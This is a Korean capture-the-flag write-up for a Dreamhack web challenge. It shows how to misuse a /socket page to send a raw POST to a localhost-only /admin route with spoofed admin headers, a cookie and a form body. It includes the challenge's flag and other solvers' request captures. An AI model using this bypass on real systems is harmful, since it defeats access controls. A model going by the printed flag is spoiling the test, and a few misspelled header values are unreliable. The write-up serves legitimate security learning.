@@ -1,0 +1,168 @@
+https://developer.mozilla.org/ko/docs/Web/HTTP/Methods/POST 
+https://medium.com/better-programming/the-anatomy-of-an-http-request-728a469ecba9 가 도움이 많이된다.
+
+/socket 페이지에서 host, port, data를 작성해서 request를 보낼수 있다.
+
+코드는 보면 app.run이 127.0.0.1에 port 8000으로도 돌아가므로 (직접 socket 내부에서 돌아가서 그렇다.)
+
+host에 127.0.0.1
+port에 8000을 적는다
+
+data부분은 request의 헤더와 바디를 적는 부분이다.
+
+HTTP request이므로 HTTP/1.1으로 보낸다
+원하는 FLAG는 /admin의 POST를 이용해 request를 보내야 한다.
+
+그 밑의 여러 if문은 헤더와 바디의 조건이다.
+이 조건들을 통과하면 FLAG가 return 된다.
+
+if request.remote_addr != '127.0.0.1':
+        return 'Only localhost'
+
+if request.headers.get('User-Agent') != 'Admin Browser':
+    return 'Only Admin Browser'
+if request.headers.get('DreamhackUser') != 'admin':
+    return 'Only Admin'
+if request.cookies.get('admin') != 'true':
+    return 'Admin Cookie'
+if request.form.get('userid') != 'admin':
+    return 'Admin id'
+return FLAG
+
+request를 보내는 시작은
+
+POST /admin HTTP/1.1으로 시작한다. Method: POST로 /admin에 HTTP/1.1형식으로 보낸다는것.
+
+remote_addr은 host의 주소로 추정.
+헤더부분은 User-Agent, DreamhackUser, Cookie이고 바디는 form이다.
+
+조건을 통과하기 위한 헤더 내용은 아래와 같이된다.
+
+User-Agent: Admin Browser
+DreamhackUser: admin
+Cookie: admin=true
+
+가 된다. 
+TIP: 서버에서 클라이언트로 쿠키 설정시 Set-Cookie: name=value를 이용하지만 클라이언트에서 서버로 쿠키 설정시 Cookie를 이용한다.
+
+userid=admin은 바디에 작성되지만 form형태로 보내야 하기 때문에 헤더에 Content-Type을 설정해줘야 한다.
+
+Content-Type은  request에 실어 보내는 데이터(body)의 type의 정보를 표현한다.
+Content-Type은 여러가지가 있다.
+ex)
+    Text타입으로는 text/css, text/javascript, text/html, text/plain등이 있다.
+
+    html문서에 type을 명시할 때 text/javascript 혹은 text/css를 많이 사용된다
+
+    File을 실어보내기 위한 타입으로는 multipart/formed-data가 있다.
+
+    그리고 Application 타입으로 application/json, application/x-www-form-urlencode가 있다.
+
+    Content Type은 Request에 실어 보내는 data의 type에 따라 적절하게 선택을 해주면 된다.
+
+여기서는 application에서 form형태로 보내기 때문에 application/x-www-form-urlencode가 사용된다.
+그리고 time out error을 피하기 위해 보낼 content의 길이를 작성해서 보낸다.
+
+보낼 바디의 데이터는 userid=admin이므로 이 길이는 12이다.
+
+즉, 헤더에 Content-Type과 Content-Length를 추가로 설정한 후 바디를 작성해서 request를 보내면 된다.
+
+Contnet-Type: application/x-www-form-urlencode
+Content-Length: 12
+
+userid=admin
+
+그래서 최종적으로 이렇게 적어서 보내면 된다.
+
+host: 127.0.0.1
+port: 8000
+data:
+    POST /admin HTTP/1.1
+    User-Agent: Admin Browser
+    DreamhackUser: admin
+    Cookie: admin=true
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 12
+
+    userid=admin
+
+이렇게 Request보내면 답이 나온다.
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 36
+Server: Werkzeug/1.0.1 Python/3.8.2
+Date: Fri, 19 Feb 2021 15:33:50 GMT
+
+DH{9bb7177b6267ff7288e24e06d8dd6df5}
+
+
+다른 사람들 답 :
+
+POST /admin HTTP/1.1
+Host: host1.dreamhack.games:23073
+Content-Length: 32
+Cache-Control: max-age=0
+DreamhackUser: admin
+Upgrade-Insecure-Requests: 1
+Origin: http://host1.dreamhack.games:23073
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Admin Browser
+Cookie: admin=true;
+Connection: close
+
+userid=admin&port=8000&data=asdf
+
+
+문제를 보면 /socket 에 접근하여 host, port, data 에 해당하는 데이터를 넘겨주면 socket 를 통해 직접 통신을 하고 그 결과를 리턴 해준다.
+
+이때 /admin 에서 접근이 가능한 조건들을 하나씩 만족 시켜주면 된다.
+
+일단 127.0.0.1 에서 접근하는것은 socket 으로 직접 서버 내부에서 작동 하기 때문에 통과하고 나머지는 HTTP packet 형태에 맞춰 완성해주면 된다.
+
+POST /admin HTTP/1.1
+Host: host1.dreamhack.games:8203
+User-Agent: Admin Browser
+DreamhackUser: admin
+Cookie: admin=true
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+
+userid=admin
+
+
+POST /socket HTTP/1.1
+Host: host1.dreamhack.games:9690
+Content-Length: 234
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://host1.dreamhack.games:9690
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://host1.dreamhack.games:8678/socket
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+host=0.0.0.0&port=8000&data=POST /admin HTTP/1.1
+Host: host1.dreamhack.games:9690
+Content-Length: 12
+Content-Type: application/x-www-form-urlencoded
+User-Agent:Admin Browser
+DreamhackUser:admin
+Cookie: admin=true
+
+userid=admin
+
+혹은 wireshark나 burp로 헤더와 바디를 변경해서 request해도 된다.
+
+
+
+
+
+
+
+
+
+
+
